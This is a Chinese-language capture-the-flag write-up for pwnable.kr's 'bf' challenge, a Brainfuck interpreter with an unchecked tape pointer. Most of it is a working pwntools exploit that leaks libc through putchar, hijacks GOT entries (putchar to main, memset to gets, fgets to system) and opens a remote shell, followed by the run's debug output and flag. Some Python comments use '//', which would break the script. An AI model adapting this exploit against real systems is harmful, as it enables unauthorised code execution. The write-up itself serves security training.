# Brain Fuck
```
I made a simple brain-fuck language emulation program written in C. 
The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
Find a bug and exploit it to get a shell. 

Download : http://pwnable.kr/bin/bf
Download : http://pwnable.kr/bin/bf_libc.so

Running at : nc pwnable.kr 9001
```

看题，这题其实是实现了一个叫`brain fuck`语言的解释器,谷歌一下得到该语言的语法(

直接拖进ida
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t i; // [esp+28h] [ebp-40Ch]
  char s[1024]; // [esp+2Ch] [ebp-408h]
  unsigned int v6; // [esp+42Ch] [ebp-8h]

  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(s, 0, 0x400u);
  fgets(s, 1024, stdin);
  for ( i = 0; i < strlen(s); ++i )
    do_brainfuck(s[i]);
  return 0;
}

int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1;
  switch ( a1 )
  {
    case 43:
      result = p;
      ++*(_BYTE *)p;
      break;
    case 44:
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case 45:
      result = p;
      --*(_BYTE *)p;
      break;
    case 46:
      result = putchar(*(char *)p);
      break;
    case 60:
      result = p-- - 1;
      break;
    case 62:
      result = p++ + 1;
      break;
    case 91:
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

大致的逻辑是这样，直接读取输入，对输入的东东进行解释

在 `do_brainfuck` 中可以看到程序一共支持 `brainfuck` 的6种操作  `> < + - . ,` 具体含义如下表：(p为指向堆的一个指针:  `0x0804a0a0`)

| 操作    |    含义      | 
| :------| ------:      | 
| >      | p += 1       |
| <      | p -= 1       |
| +      | (*p) += 1    |
| -      | (*p) -= 1    |
| .      | putchar(*p)  |
| ,      | getchar(*p)  |

所以我们这里其实有现成的内存读写

直接上 `gdb` 
```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
开的保护也就 `canary` 和 `NX` , 这对我们直接的内存读写没啥卵用.

我们这里直接就想到 `GOT Hijacking`

大致浏览下程序，我们想要拿到 `shell` , 这里我们需要一个 `system` , 还有 `/bin/sh` , 我们需要将`/bin/sh`的地址传入 `system` 函数 ，这里就找到了一个很符合的

```
  memset(s, 0, 0x400u);
  fgets(s, 1024, stdin);
```

这里我们把 `memset` 函数的 `got` 改成 `get`函数,`fgets` 函数的 `got` 改成 `system`,然后输入 `/bin/sh` , 我们直接就拿到了 `shell` 了.

我们通过内存读写，先改掉上面两个函数的 `GOT` 之后 ，我们怎么跳回来呢 ，这里我们再改一个函数的 `GOT` 函数为 `main` 函数的起始地址 ， 这样我们调用那个函数的时候就会直接跳到了程序的开始 `main` .

直接选了 `putchar` 函数 

直接上`exp`

```
from pwn import *
import sys
context.log_level = 'debug'
elf_s = ELF('./bf')

if sys.argv[1] == 'connect':
    bin = remote('pwnable.kr',9001)
else:
    bin = process('./bf')
libc = ELF('./bf_libc.so')
#libc = ELF('/usr/lib32/libc.so.6')
putchar_got_addr = elf_s.got['putchar']
memset_got_addr = elf_s.got['memset']
fget_got_addr = elf_s.got['fgets']
p = 0x0804a0a0
main_addr = elf_s.symbols['main']

def back(n):
    return '<'*n // 移动函数指针

def read(n):
    return '.>'*n // 边移动指针边读值

def write(n):
    return ',>'*n // 边移动指针边写

// 这里多输入一个点号的意思是，先让 lazy binding 起作用
payload = '<'*(p-putchar_got_addr) + '.' + read(4)   // 移动指针到 putchar 的 got 表处，读出 4 个字节，即putchar的真实载入地址
payload += '<'*4 + write(4) // 进行 Hijacking 成 main 函数
payload += '<'*(putchar_got_addr-memset_got_addr+4) + write(4) // 移动指针到memset处，进行 Hijacking 成 get 函数
payload += '<'*(memset_got_addr-fget_got_addr+4) + write(4) //移动指针到 fget 处，进行 Hijacking 成 system 函数
payload += '.' //触发 putchar got 返回 main

bin.recvuntil('[ ]\n')                                                                                            
bin.sendline(payload)                                                                                             
bin.recv(1)    // 丢弃为了 lazy binding 输出                                                                                
putchar_addr = u32(bin.recv(4))
log.success('putchar_addr: ' + hex(putchar_addr))                                                                   
#gdb.attach(bin)

libc_base = putchar_addr - libc.symbols['putchar']
gets_addr = libc_base + libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']

log.success('libc_base addr: '+hex(libc_base))
log.success('gets addr: '+hex(gets_addr))
log.success('system addr: '+hex(system_addr))

bin.send(p32(main_addr))
bin.send(p32(gets_addr))
bin.send(p32(system_addr))
bin.sendline('/bin/sh') // 响应 hijacking 出来的 get 函数
bin.interactive()  
```
直接开打
```
➜  bf (attenuation@Attenuation-hp) python2 exploit_bf.py connect
[DEBUG] PLT 0x8048440 getchar
[DEBUG] PLT 0x8048450 fgets
[DEBUG] PLT 0x8048460 __stack_chk_fail
[DEBUG] PLT 0x8048470 puts
[DEBUG] PLT 0x8048480 __gmon_start__
[DEBUG] PLT 0x8048490 strlen
[DEBUG] PLT 0x80484a0 __libc_start_main
[DEBUG] PLT 0x80484b0 setvbuf
[DEBUG] PLT 0x80484c0 memset
[DEBUG] PLT 0x80484d0 putchar
[*] '/home/attenuation/ctf/pwnable-kr/bf/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwnable.kr on port 9001: Done
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/home/attenuation/ctf/pwnable-kr/bf/bf_libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x52 bytes:
    'welcome to brainfuck testing system!!\n'
    'type some brainfuck instructions except [ ]\n'
[DEBUG] Sent 0xbf bytes:
    '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<..>.>.>.><<<<,>,>,>,><<<<<<<<,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,>.\n'
[DEBUG] Received 0x1 bytes:
    00000000  d6                                                  │·│
    00000001
[DEBUG] Received 0x4 bytes:
    00000000  20 c9 58 f7                                         │ ·X·││
    00000004
0xf758c920
[+] putchar_addr: 0xf758c920
[+] libc_base addr: 0xf752b000
[+] gets addr: 0xf758a3e0
[+] system addr: 0xf7565da0
[DEBUG] Sent 0x4 bytes:
    00000000  71 86 04 08                                         │q···││
    00000004
[DEBUG] Sent 0x4 bytes:
    00000000  e0 a3 58 f7                                         │··X·││
    00000004
[DEBUG] Sent 0x4 bytes:
    00000000  a0 5d 56 f7                                         │·]V·││
    00000004
[DEBUG] Sent 0x8 bytes:
    '/bin/sh\n'
[*] Switching to interactive mode
[DEBUG] Received 0x25 bytes:
    'welcome to brainfuck testing system!!'
welcome to brainfuck testing system!![DEBUG] Received 0x2d bytes:
    '\n'
    'type some brainfuck instructions except [ ]\n'

type some brainfuck instructions except [ ]
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x23 bytes:
    'BrainFuck? what a weird language..\n'
BrainFuck? what a weird language..
$  
```

